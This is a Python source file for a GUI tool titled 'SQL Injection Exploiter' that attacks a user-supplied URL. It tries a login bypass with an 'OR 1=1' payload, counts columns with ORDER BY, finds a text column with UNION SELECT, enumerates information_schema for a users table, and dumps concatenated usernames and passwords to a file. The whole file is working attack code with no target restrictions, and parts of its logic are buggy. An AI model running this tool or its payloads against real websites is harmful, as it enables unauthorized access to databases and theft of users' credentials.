import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
import tkinter as tk
from tkinter import messagebox, StringVar, filedialog

from diff import difference

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def has_parameters(url):
    # Check if '?' is present in the URL
    if '?' in url:
        # Split the URL into base and parameters
        base_url, params_str = url.split('?', 1)
        
        # Check if '=' is present in the parameters
        if '=' in params_str:
            return True
    
    return False


def perform_request(url, sql_payload, method, post_data):
    if method == 'GET':
        r = requests.get(url+ sql_payload, verify=False,proxies=proxies)
    elif method == 'POST':
        r = requests.post(url, data=post_data, verify=False,proxies=proxies)
    else:
        raise ValueError("Invalid method specified.")
    return r

def try_login(url, method,post_data):
    sql_payload="'OR 1=1 # "
    def get_csrf_token(url):
        r = requests.get(url, verify=False)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find("input")['value']
        return csrf
    try:
        csrf = get_csrf_token(url)
        if csrf:
            data = {"csrf": csrf}
            data.update({key: value for key, value in (item.split('=') for item in post_data.split('&'))})
            data[list(data.keys())[1]] = sql_payload
            print(data)
        res = perform_request(url,sql_payload, method, data)
    
    except:
        post_data[list(post_data.keys())[0]] = sql_payload
        print(post_data)
        res = perform_request(url, sql_payload,method, post_data)
        if res.status_code == 200:
            return True,sql_payload
        else:
            return False              

def exploit_sqli_column_number(url,method,post_data=None):
    if method == 'GET':
            for i in range(1,50):
                sql_payload = "'+order+by+%s--" %i
                print(sql_payload)
                r = requests.get(url + sql_payload, verify=False, proxies=proxies)
                if r.status_code == 500:
                    if i-1 == 0:
                        return "one column"
                    return i - 1
                i = i + 1
    

def exploit_sqli_string_field(url, num_col,method,post_data=None):
    if method == 'GET':
        for i in range(1, num_col+1):
            string = "'v2F6UA'"
            payload_list = ['null'] * num_col
            payload_list[i-1] = string
            sql_payload = "' union select " + ','.join(payload_list) + "--"
            r = requests.get(url + sql_payload, verify=False, proxies=proxies)
            res = r.text
            if string.strip('\'') in res:
                return i
        return False
    
    elif method == 'POST':
        for i in range(1, num_col+1):
            string = "'v2F6UA'"
            payload_list = ['null'] * num_col
            payload_list[i-1] = string
            sql_payload = "' union select " + ','.join(payload_list) + "--"
            post_data[list(post_data.keys())[0]] = sql_payload
            print(sql_payload)
            r = requests.post(url,data=post_data, verify=False, proxies=proxies)
            res = r.text
            if string.strip('\'') in res:
                return i
        return False


def generate_sql_payload(num_columns, text_column_index,detail,users_table=None):
    null_columns = ["NULL"] * num_columns
    null_columns[text_column_index - 1] = detail
    if detail == "table_name":
        sql_payload = "' UNION SELECT " + ", ".join(null_columns) + " FROM information_schema.tables--"
    elif detail == "column_name":
        sql_payload = "' UNION SELECT " + ", ".join(null_columns) + " FROM information_schema.columns WHERE table_name = '%s'--" % users_table
    elif detail == "all":
        null_columns[text_column_index - 1] = f"CONCAT(username, '~~', password)"
        sql_payload = "' UNION SELECT " + ", ".join(null_columns) + " FROM users--"  #"  WHERE table_name = '%s'--" % users_table
    return sql_payload  

def exploit_sqli_users_table(url, method, post_data=None):
    print("[+] Figuring out number of columns...")
    global num_col
    num_col = exploit_sqli_column_number(url,method,post_data)
    print(num_col)
    if num_col:
        print("[+] The number of columns is " + str(num_col) + "." )
        print("[+] Figuring out which column contains text...")
        if num_col =="one column":
            num_col=1
            global string_column
            string_column = exploit_sqli_string_field(url, num_col,method,post_data)
        string_column = exploit_sqli_string_field(url, num_col,method,post_data)
        if string_column:
            print("[+] The column that contains text is " + str(string_column) + ".")
        else:
            print("[-] We were not able to find a column that has a string data type.")

    sql_payload = generate_sql_payload(num_col,string_column,"table_name")
    print(sql_payload)
    res = perform_request(url, sql_payload, method, post_data)
    print(res)
    soup = BeautifulSoup(res.text, 'html.parser')
    users_table = soup.find(text=re.compile('.*users.*'))
    return users_table,num_col,string_column



def exploit_sqli_users_columns(url, users_table, method, post_data,num_col,string_column):
    sql_payload = generate_sql_payload(num_col,string_column,"column_name",users_table)
    print(sql_payload)
    res = perform_request(url, sql_payload, method, post_data)
    soup = BeautifulSoup(res.text, 'html.parser')

    username_column = soup.find(text=re.compile('.*username.*'))

    password_column = soup.find(text=re.compile('.*password.*'))
    print(password_column)
    print(username_column)
    return username_column, password_column

def exploit_sqli_user_cred(url, users_table, username_column, password_column, method='GET', post_data=None):
    # sql_payload = "' UNION select CONCAT(%s, '~', %s)sfrom %s--" % (username_column, password_column, users_table)
    sql_payload = generate_sql_payload(num_col,string_column,"all",users_table)
    res = perform_request(url, sql_payload, method, post_data)
    res1 = requests.get(url)
    soup = BeautifulSoup(res.text, 'html.parser')
    soup2 = BeautifulSoup(res1.text, 'html.parser')
    output = difference(str(soup), str(soup2))
    return output

def save_to_file(content):
    file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
    if file_path:
        with open(file_path, 'w') as file:
            file.write(content)
        messagebox.showinfo("Save Successful", "Results saved to file.")


def main():
    def execute_sql_injection():
        try:
            url = url_entry.get().strip()
            if url:
                try:
                    r = requests.get(url, verify=False,proxies=proxies)
                    if r.status_code != 200:
                        result_text.insert(tk.END, "Please provide a valid URL\n")
                        return 
                except:
                    result_text.insert(tk.END, "Please provide a valid URL\n")   
        except IndexError:
            result_text.insert(tk.END, "Please provide a valid URL\n")
            return

        result_text.delete(1.0, tk.END)  # Clear previous results

        method = 'GET' if method_var.get() == 0 else 'POST'
        post_data= None
        if method == 'POST':
            data = post_data_entry.get() if method == 'POST' else None
            # post_data={key: value for key, value in (item.split('=') for item in data.split('&'))}
            # post_data = {key: value for key, value in (item.split('=') for item in data.split('&'))}
            if data is None:
                result_text.insert(tk.END, "Please enter post data)\n")
            try:
                post_data = {key: value for key, value in (item.split('=') for item in data.split('&'))}
                if 'username' in post_data and 'password' in post_data:
                    return True, post_data
                
            except:
                result_text.insert(tk.END, "Incorrect Post format (e.g username=user&password=pass)\n")
                return
            if try_login_option.get():
                login_successful = try_login(url, method, post_data)
                if login_successful[0]:
                    result_text.insert(tk.END, "[+] Login Successful!\n")
                    result_text.insert(tk.END, f"[+] Payload = {login_successful[1]}\n")
                else:
                    result_text.insert(tk.END, "[-] Login Failed. Stopping execution.\n")
                    return
                
            else:
                result_text.insert(tk.END, "[-] Please select try login option.\n")
                return
        elif method == "GET":
            if has_parameters(url):
                users_table,num_col,string_column = exploit_sqli_users_table(url, method)
                print("Looking for the users table...")
                if users_table:
                    result_text.insert(tk.END, "Found the users table name: %s\n" % users_table)
                    username_column, password_column = exploit_sqli_users_columns(url, users_table, method, post_data,num_col,string_column)
                    if username_column and password_column:
                        result_text.insert(tk.END, "Found the username column name: %s\n" % username_column)
                        result_text.insert(tk.END, "Found the password column name: %s\n" % password_column)

                        user_cred = exploit_sqli_user_cred(url, users_table, username_column, password_column, method, post_data)
                        if user_cred:
                            result_text.insert(tk.END, "[+] The username and password are as below: \n")
                            for value in user_cred:
                                result_text.insert(tk.END, "[+] %s\n" % value)
                            menu.add_command(label="Save to File", command=lambda: save_to_file('\n'.join(user_cred)))
                        else:
                            result_text.insert(tk.END, "Did not find the administrator password\n")
                    else:
                        result_text.insert(tk.END, "Did not find the username and/or the password columns\n")
                else:
                    result_text.insert(tk.END, "Did not find a users table.\n")
            else:
                result_text.insert(tk.END, "Invalid url.\n")
    root = tk.Tk()
    root.title("SQL Injection Exploiter")

    url_label = tk.Label(root, text="Enter URL:")
    url_label.pack()

    url_entry = tk.Entry(root, width=40)
    url_entry.pack()

    method_var = tk.IntVar()
    method_checkbutton = tk.Checkbutton(root, text="Use POST", variable=method_var)
    method_checkbutton.pack()

    post_data_label = tk.Label(root, text="Enter POST Data:")
    post_data_label.pack()

    post_data_entry = tk.Entry(root, width=40)
    post_data_entry.pack()

    try_login_option = tk.BooleanVar()
    try_login_checkbutton = tk.Checkbutton(root, text="Try Login", variable=try_login_option)
    try_login_checkbutton.pack()

    execute_button = tk.Button(root, text="Execute SQL Injection", command=execute_sql_injection)
    execute_button.pack()

    result_label = tk.Label(root, text="Results:")
    result_label.pack()

    result_text = tk.Text(root, height=10, width=60)
    result_text.pack()

    menu = tk.Menu(root)
    root.config(menu=menu)
    file_menu = tk.Menu(menu, tearoff=0)
    menu.add_cascade(label="File", menu=file_menu)

    file_menu.add_command(label="Exit", command=root.destroy)




    root.mainloop()

if __name__ == "__main__":
    main()
